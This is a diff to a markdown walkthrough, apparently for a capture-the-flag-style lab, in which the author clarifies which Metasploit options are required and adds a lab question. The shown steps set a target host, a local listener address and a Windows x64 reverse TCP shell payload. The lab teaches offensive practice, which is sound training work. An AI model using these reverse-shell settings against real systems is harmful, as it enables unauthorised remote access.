@@ -75,12 +75,14 @@ This will also now provide us with the answer to our first question in this sect
 
 Now that we have loaded this module we will need to configure a couple of items. Firstly lets view our options via ```show options```  
 ![Gain Access - Initial options](./Images/Gain%20Access%20-%20Initial%20options.png)  
-The items we will need to change are **RHOSTS**, **LHOST** and the **Payload**  
+The items we will need to change are **RHOSTS**, **LHOST** and the **Payload**  Noting that only the **RHOSTS** is empty and required to be set for the module. The **LHOST** is part of the payload options.  
 
 Do this via the following commands  
 ```set RHOSTS TARGET_IP```  
 ```set LHOST YOUR_MACHINE_IP```  
 ```set payload windows/x64/shell/reverse_tcp```  
+
+This should give you the information to answer the next question: **Show options and set the one required value. What is the name of this value?**  
 
 Now we can view our options again via ```show options``` and confirm our remote and local host IP's are correct and that our payload has been adjusted as required.  
 ![Gain Access - options final](./Images/Gain%20Access%20-%20options%20final.png)
